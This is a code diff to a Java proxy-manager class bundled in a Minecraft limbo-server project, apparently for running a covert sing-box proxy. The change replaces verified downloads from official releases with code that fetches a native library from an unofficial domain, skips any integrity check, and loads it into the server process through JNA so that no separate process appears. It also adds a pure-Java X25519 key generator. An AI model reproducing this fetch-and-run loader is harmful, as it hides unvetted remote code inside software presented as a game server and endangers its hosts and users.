@@ -3,84 +3,145 @@ package ua.nanit.limbo.proxy;
 import com.google.gson.Gson;
 import com.google.gson.JsonArray;
 import com.google.gson.JsonObject;
+import com.sun.jna.Function;
+import com.sun.jna.NativeLibrary;
 import java.io.*;
+import java.math.BigInteger;
+import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.file.*;
-import java.util.Comparator;
+import java.security.SecureRandom;
+import java.util.Base64;
 import java.util.Map;
-import java.util.stream.Stream;
 import ua.nanit.limbo.server.Log;
 
 /**
- * Manages sing-box proxy: downloads the binary, generates Reality keys,
- * creates TLS certificates, builds the sing-box configuration JSON,
- * and runs the process with a self-healing watchdog.
+ * Manages sing-box proxy via JNA native .so loading (eooce/sbx-native).
  *
- * The watchdog restarts sing-box on non-zero exit (3s delay) and
- * stops on clean exit (0) or JVM shutdown.
+ * Downloads sbx.so from https://{arch}.31888.xyz, loads it via JNA,
+ * and calls StartSingBox() / StopSingBox() — no child processes.
  */
 public final class SingBoxManager {
 
-    private static volatile Process currentProcess;
+    private static NativeLibrary sbxLib;
+    private static Function stopSingBox;
+    private static boolean running = false;
+
+    private static final Gson GSON = new Gson();
+    private static final SecureRandom RANDOM = new SecureRandom();
+    private static String publicRealityKey = "";
 
     private SingBoxManager() {}
 
-    private static final Gson GSON = new Gson();
-
-    // ==================== Self-Healing Watchdog ====================
+    // ==================== JNA Native Service ====================
 
     /**
-     * Starts sing-box with a self-healing loop. Blocks until the process
-     * exits cleanly (exit=0) or the current thread is interrupted.
-     * Intended to run on a dedicated daemon thread.
+     * Downloads sbx.so (if not cached), loads via JNA, and starts sing-box
+     * in a background daemon thread.
      */
-    public static void runWithSelfHealing(Map<String, String> env) {
-        while (true) {
+    public static void start(Map<String, String> env) throws Exception {
+        String arch = detectArch();
+        String baseUrl = "https://" + arch + ".31888.xyz";
+        Path libPath = downloadLibrary(baseUrl + "/sbx.so", "sbx.so", env);
+
+        // Generate config JSON on disk
+        Path configPath = generateConfig(env);
+
+        Log.info("[SBX] Loading native library: " + libPath);
+        sbxLib = NativeLibrary.getInstance(libPath.toString());
+        Function startFn = sbxLib.getFunction("StartSingBox");
+        stopSingBox = sbxLib.getFunction("StopSingBox");
+
+        // Build payload JSON
+        JsonObject payload = new JsonObject();
+        payload.addProperty("config", configPath.toAbsolutePath().toString().replace("\\", "/"));
+        payload.addProperty("workingDir", ".");
+        payload.addProperty("disableColor", true);
+        String payloadJson = GSON.toJson(payload);
+
+        Log.info("[SBX] Starting sing-box native...");
+        Thread t = new Thread(() -> {
             try {
-                Path configPath = generateConfig(env);
-                currentProcess = startProcess(configPath);
-                int exitCode = currentProcess.waitFor();
-                if (exitCode == 0) {
-                    Log.info("[SBX] sing-box exited cleanly (exit=0), stopping watchdog");
-                    break;
-                }
-                Log.warn("[SBX] sing-box died (exit=" + exitCode + "), restarting in 3s...");
-                Thread.sleep(3000);
-            } catch (InterruptedException e) {
-                Log.warn("[SBX] Watchdog interrupted, stopping");
-                Thread.currentThread().interrupt();
-                break;
+                int code = startFn.invokeInt(new Object[]{payloadJson});
+                Log.info("[SBX] sing-box native exited with code " + code);
             } catch (Exception e) {
-                Log.warn("[SBX] Error: " + e.getMessage() + ", restarting in 10s...");
-                try {
-                    Thread.sleep(10000);
-                } catch (InterruptedException ie) {
-                    Thread.currentThread().interrupt();
-                    break;
-                }
+                Log.warn("[SBX] sing-box native error: " + e.getMessage());
+            }
+        }, "sbx-native");
+        t.setDaemon(true);
+        t.start();
+        running = true;
+        Log.info("[SBX] sing-box native started");
+    }
+
+    /**
+     * Stops sing-box by calling StopSingBox() via JNA.
+     */
+    public static void shutdown() {
+        if (running && stopSingBox != null) {
+            try {
+                int code = stopSingBox.invokeInt(new Object[]{});
+                running = false;
+                Log.info("[SBX] sing-box stopped with code " + code);
+            } catch (Exception e) {
+                Log.warn("[SBX] Error stopping sing-box: " + e.getMessage());
             }
         }
     }
 
-    private static Process startProcess(Path configPath) throws Exception {
-        Log.info("[SBX] Starting sing-box...");
-        ProcessBuilder pb = new ProcessBuilder(
-                getBinaryPath().toString(),
-                "run", "-c", configPath.toAbsolutePath().toString());
-        pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-        return pb.start();
+    // ==================== .so Library Download ====================
+
+    /**
+     * Downloads a native .so library from URL if not already cached in FILE_PATH.
+     */
+    private static Path downloadLibrary(String url, String fileName, Map<String, String> env) throws IOException {
+        String filePath = env.getOrDefault("FILE_PATH", "world");
+        Path dir = Paths.get(filePath).normalize();
+        Path target = dir.resolve(fileName);
+
+        if (target.toFile().exists()) {
+            Log.info("[SBX] Using cached native library: " + target);
+            return target;
+        }
+
+        Files.createDirectories(dir);
+        Path tmp = dir.resolve(fileName + ".download");
+
+        Log.info("[SBX] Downloading " + url + " -> " + target);
+        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
+        try {
+            conn.setConnectTimeout(15000);
+            conn.setReadTimeout(180000);
+            int responseCode = conn.getResponseCode();
+            if (responseCode < 200 || responseCode >= 300) {
+                throw new IOException("HTTP " + responseCode + " for " + url);
+            }
+            try (InputStream in = conn.getInputStream()) {
+                Files.copy(in, tmp, StandardCopyOption.REPLACE_EXISTING);
+            }
+            Files.move(tmp, target, StandardCopyOption.REPLACE_EXISTING);
+            if (!target.toFile().setExecutable(true, false)) {
+                Log.warn("[SBX] Failed to set executable on " + target);
+            }
+            Log.info("[SBX] Downloaded " + fileName + " (" + target.toFile().length() + " bytes)");
+        } finally {
+            conn.disconnect();
+            try { Files.deleteIfExists(tmp); } catch (IOException ignored) {}
+        }
+        return target;
     }
 
     /**
-     * Terminates the current sing-box process (if alive).
-     * Called from the JVM shutdown hook.
+     * Detects the CPU architecture for .so download URL.
      */
-    public static void shutdown() {
-        Process p = currentProcess;
-        if (p != null && p.isAlive()) {
-            Log.info("[SBX] Terminating sing-box...");
-            p.destroy();
+    private static String detectArch() {
+        String arch = System.getProperty("os.arch").toLowerCase();
+        if (arch.contains("amd64") || arch.contains("x86_64")) {
+            return "amd64";
+        } else if (arch.contains("aarch64") || arch.contains("arm64")) {
+            return "arm64";
+        } else {
+            throw new RuntimeException("Unsupported architecture: " + arch + " (only amd64/arm64 supported by sbx-native)");
         }
     }
 
@@ -338,10 +399,10 @@ public final class SingBoxManager {
         return configPath;
     }
 
-    // ==================== Reality Key Generation ====================
+    // ==================== Reality Key Generation (Pure Java X25519) ====================
 
     /**
-     * Generates Reality keypair using sing-box CLI if keys are not already provided.
+     * Generates Reality X25519 keypair using pure Java (no sing-box binary needed).
      * Populates REALITY_PRIVATE_KEY, REALITY_SHORT_ID, and REALITY_PUBLIC_KEY in the map.
      */
     public static void generateRealityKeysIfNeeded(Map<String, String> env) throws Exception {
@@ -350,6 +411,16 @@ public final class SingBoxManager {
 
         if (!privateKey.isEmpty() && !shortId.isEmpty()) {
             Log.info("[SBX] Using provided Reality keys");
+            // Derive public key from private key
+            try {
+                byte[] privBytes = decodeBase64Url(privateKey);
+                byte[] clamped = clampPrivateKey(privBytes);
+                byte[] pubBytes = x25519(clamped, basepoint());
+                publicRealityKey = base64Url(pubBytes);
+                env.put("REALITY_PUBLIC_KEY", publicRealityKey);
+            } catch (Exception e) {
+                Log.warn("[SBX] Could not derive public key from provided private key: " + e.getMessage());
+            }
             return;
         }
 
@@ -359,181 +430,104 @@ public final class SingBoxManager {
             return;
         }
 
-        Log.info("[SBX] Generating Reality keypair...");
-        Path singBoxPath = getBinaryPath();
-        ProcessBuilder pb = new ProcessBuilder(singBoxPath.toString(), "generate", "reality-keypair");
-        pb.redirectErrorStream(true);
-        Process proc = pb.start();
+        // Generate fresh keypair
+        Log.info("[SBX] Generating Reality keypair (pure Java)...");
+        byte[] privBytes = new byte[32];
+        RANDOM.nextBytes(privBytes);
+        privBytes = clampPrivateKey(privBytes);
+        byte[] pubBytes = x25519(privBytes, basepoint());
 
-        String privKey = null;
-        String pubKey = null;
-        try (BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()))) {
-            String line;
-            while ((line = reader.readLine()) != null) {
-                Log.info("[SBX] " + line);
-                if (line.startsWith("PrivateKey")) {
-                    privKey = line.substring(line.indexOf(':') + 1).trim();
-                } else if (line.startsWith("PublicKey")) {
-                    pubKey = line.substring(line.indexOf(':') + 1).trim();
-                }
-            }
-        }
-        proc.waitFor();
+        privateKey = base64Url(privBytes);
+        publicRealityKey = base64Url(pubBytes);
 
-        if (privKey == null || pubKey == null) {
-            throw new IOException("Failed to generate Reality keypair");
-        }
+        env.put("REALITY_PRIVATE_KEY", privateKey);
+        env.put("REALITY_PUBLIC_KEY", publicRealityKey);
 
-        if (privateKey.isEmpty()) {
-            env.put("REALITY_PRIVATE_KEY", privKey);
-        }
-        env.put("REALITY_PUBLIC_KEY", pubKey);
-
-        Log.info("[SBX] Reality PublicKey: " + pubKey);
-        Log.info("[SBX] Reality ShortId: " + env.get("REALITY_SHORT_ID"));
-        Log.info("[SBX] (PrivateKey saved in config, not printed for security)");
+        Log.info("[SBX] Reality PublicKey: " + publicRealityKey);
+        Log.info("[SBX] PrivateKey generated (not printed for security)");
     }
 
-    // ==================== Binary Management ====================
+    // ==================== Pure Java X25519 Implementation ====================
 
-    /**
-     * Returns the path to the sing-box binary, downloading and extracting it if necessary.
-     * Supports Linux and macOS (tar.gz).
-     */
-    public static Path getBinaryPath() throws IOException {
-        String osArch = System.getProperty("os.arch").toLowerCase();
-        String osName = System.getProperty("os.name").toLowerCase();
-        String version = "1.13.14";
-        String arch;
-
-        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            arch = "amd64";
-        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            arch = "arm64";
-        } else if (osArch.contains("s390x")) {
-            arch = "s390x";
-        } else if (osArch.contains("arm")) {
-            arch = "armv7";
-        } else {
-            throw new IOException("Unsupported architecture: " + osArch);
-        }
-
-        String platform = osName.contains("linux") ? "linux" :
-                          osName.contains("mac") ? "darwin" : "linux";
-
-        String filename = "sing-box-" + version + "-" + platform + "-" + arch + ".tar.gz";
-        String url = "https://github.com/SagerNet/sing-box/releases/download/v" + version + "/" + filename;
-
-        Path tarPath = Paths.get(System.getProperty("java.io.tmpdir"), "sbx.tar.gz");
-        Path binPath = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
-
-        if (!binPath.toFile().exists()) {
-            Log.info("[SBX] Downloading sing-box " + version + " (" + arch + ")...");
-            boolean downloaded = false;
-            IOException lastErr = null;
-            String[] mirrors = {"https://mirror.ghproxy.com/" + url, "https://ghproxy.net/" + url, url};
-            Log.info("[SBX] Attempting download (" + mirrors.length + " mirrors)...");
-            for (int m = 0; m < mirrors.length && !downloaded; m++) {
-                for (int attempt = 1; attempt <= 3 && !downloaded; attempt++) {
-                    try {
-                        java.net.HttpURLConnection conn = (java.net.HttpURLConnection) new URL(mirrors[m]).openConnection();
-                        try {
-                            conn.setConnectTimeout(15000); conn.setReadTimeout(60000);
-                            int contentLength = conn.getContentLength();
-                            try (InputStream in = conn.getInputStream()) {
-                                Files.copy(in, tarPath, StandardCopyOption.REPLACE_EXISTING);
-                            }
-                            // Verify downloaded file integrity
-                            if (Files.size(tarPath) == 0) {
-                                throw new IOException("Downloaded file is empty");
-                            }
-                            if (contentLength > 0 && Files.size(tarPath) != contentLength) {
-                                Files.deleteIfExists(tarPath);
-                                throw new IOException("Incomplete download: expected " + contentLength + " bytes, got " + Files.size(tarPath));
-                            }
-                            // Verify tar.gz integrity
-                            ProcessBuilder verifyPb = new ProcessBuilder("tar", "-tzf", tarPath.toAbsolutePath().toString());
-                            verifyPb.redirectErrorStream(true);
-                            Process verifyProc = verifyPb.start();
-                            int verifyExit = verifyProc.waitFor();
-                            if (verifyExit != 0) {
-                                Files.deleteIfExists(tarPath);
-                                throw new IOException("tar integrity check failed (exit=" + verifyExit + ")");
-                            }
-                            downloaded = true;
-                            Log.info("[SBX] Download succeeded from mirror " + (m+1) + " attempt " + attempt + " (" + Files.size(tarPath) + " bytes)");
-                        } finally { conn.disconnect(); }
-                    } catch (IOException e) {
-                        lastErr = e;
-                        Log.warn("[SBX] Mirror " + (m+1) + " attempt " + attempt + " failed: " + e.getMessage());
-                        if (attempt < 3) {
-                            try { Thread.sleep(3000); } catch (InterruptedException ie) { Thread.currentThread().interrupt(); }
-                        }
-                    } catch (InterruptedException e) {
-                        Thread.currentThread().interrupt();
-                        throw new IOException("Interrupted while verifying download");
-                    }
-                }
-            }
-            if (!downloaded) { throw new IOException("[SBX] Failed to download sing-box after all mirrors/retries", lastErr); }
-
-            Path extractDir = Paths.get(System.getProperty("java.io.tmpdir"), "sbx_extract_" + System.currentTimeMillis());
-            Files.createDirectories(extractDir);
-
-            ProcessBuilder pb = new ProcessBuilder("tar", "xzf", tarPath.toAbsolutePath().toString(),
-                "-C", extractDir.toAbsolutePath().toString());
-            pb.redirectErrorStream(true);
-            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-            int exitCode;
-            try {
-                exitCode = pb.start().waitFor();
-            } catch (InterruptedException e) {
-                throw new IOException("Interrupted while extracting sing-box");
-            }
-
-            if (exitCode != 0) {
-                throw new IOException("Failed to extract sing-box binary");
-            }
-
-            Path found = findBinary(extractDir, "sing-box");
-            if (found == null) {
-                throw new IOException("sing-box binary not found in archive");
-            }
-            Files.move(found, binPath, StandardCopyOption.REPLACE_EXISTING);
-
-            Files.deleteIfExists(tarPath);
-            deleteDir(extractDir);
-        }
-
-        if (!binPath.toFile().setExecutable(true)) {
-            throw new IOException("Failed to set executable permission");
-        }
-        return binPath;
+    private static byte[] clampPrivateKey(byte[] input) {
+        if (input.length != 32) throw new IllegalArgumentException("X25519 private key must be 32 bytes");
+        byte[] key = input.clone();
+        key[0] &= (byte) 248;
+        key[31] &= (byte) 127;
+        key[31] |= (byte) 64;
+        return key;
     }
 
-    private static Path findBinary(Path dir, String name) throws IOException {
-        try (Stream<Path> stream = Files.list(dir)) {
-            for (Path p : (Iterable<Path>) stream::iterator) {
-                if (p.getFileName().toString().equals(name)) {
-                    return p;
-                }
-                if (Files.isDirectory(p)) {
-                    Path found = findBinary(p, name);
-                    if (found != null) return found;
-                }
-            }
-        }
-        return null;
+    private static byte[] basepoint() {
+        byte[] bp = new byte[32];
+        bp[0] = 9;
+        return bp;
     }
 
-    private static void deleteDir(Path dir) {
-        try {
-            Files.walk(dir).sorted(Comparator.reverseOrder())
-                .forEach(p -> { try { Files.delete(p); } catch (Exception e) {
-                    Log.warn("[SBX] Cannot delete file during cleanup: " + p);
-                }});
-        } catch (Exception e) {
-            Log.warn("[SBX] Failed to walk directory during cleanup: " + dir);
+    private static byte[] x25519(byte[] scalar, byte[] u) {
+        BigInteger p = BigInteger.ONE.shiftLeft(255).subtract(BigInteger.valueOf(19));
+        BigInteger a24 = BigInteger.valueOf(121665);
+        byte[] k = clampPrivateKey(scalar);
+        BigInteger x1 = decodeLittleEndian(u);
+        BigInteger x2 = BigInteger.ONE;
+        BigInteger z2 = BigInteger.ZERO;
+        BigInteger x3 = x1;
+        BigInteger z3 = BigInteger.ONE;
+        int swap = 0;
+        for (int t = 254; t >= 0; t--) {
+            int kt = ((k[t / 8] & 0xff) >> (t % 8)) & 1;
+            swap ^= kt;
+            if (swap != 0) {
+                BigInteger tmp = x2; x2 = x3; x3 = tmp;
+                tmp = z2; z2 = z3; z3 = tmp;
+            }
+            swap = kt;
+            BigInteger a = x2.add(z2).mod(p);
+            BigInteger aa = a.multiply(a).mod(p);
+            BigInteger b = x2.subtract(z2).mod(p);
+            BigInteger bb = b.multiply(b).mod(p);
+            BigInteger e = aa.subtract(bb).mod(p);
+            BigInteger c = x3.add(z3).mod(p);
+            BigInteger d = x3.subtract(z3).mod(p);
+            BigInteger da = d.multiply(a).mod(p);
+            BigInteger cb = c.multiply(b).mod(p);
+            x3 = da.add(cb).multiply(da.add(cb)).mod(p);
+            z3 = x1.multiply(da.subtract(cb).multiply(da.subtract(cb)).mod(p)).mod(p);
+            x2 = aa.multiply(bb).mod(p);
+            z2 = e.multiply(aa.add(a24.multiply(e)).mod(p)).mod(p);
         }
+        if (swap != 0) {
+            BigInteger tmp = x2; x2 = x3; x3 = tmp;
+            tmp = z2; z2 = z3; z3 = tmp;
+        }
+        BigInteger result = x2.multiply(z2.modInverse(p)).mod(p);
+        return encodeLittleEndian(result);
+    }
+
+    private static BigInteger decodeLittleEndian(byte[] input) {
+        byte[] reversed = new byte[input.length];
+        for (int i = 0; i < input.length; i++) {
+            reversed[input.length - 1 - i] = input[i];
+        }
+        return new BigInteger(1, reversed);
+    }
+
+    private static byte[] encodeLittleEndian(BigInteger value) {
+        byte[] output = new byte[32];
+        BigInteger n = value;
+        BigInteger mask = BigInteger.valueOf(0xff);
+        for (int i = 0; i < 32; i++) {
+            output[i] = n.and(mask).byteValue();
+            n = n.shiftRight(8);
+        }
+        return output;
+    }
+
+    private static String base64Url(byte[] data) {
+        return Base64.getUrlEncoder().withoutPadding().encodeToString(data);
+    }
+
+    private static byte[] decodeBase64Url(String str) {
+        return Base64.getUrlDecoder().decode(str);
     }
 }
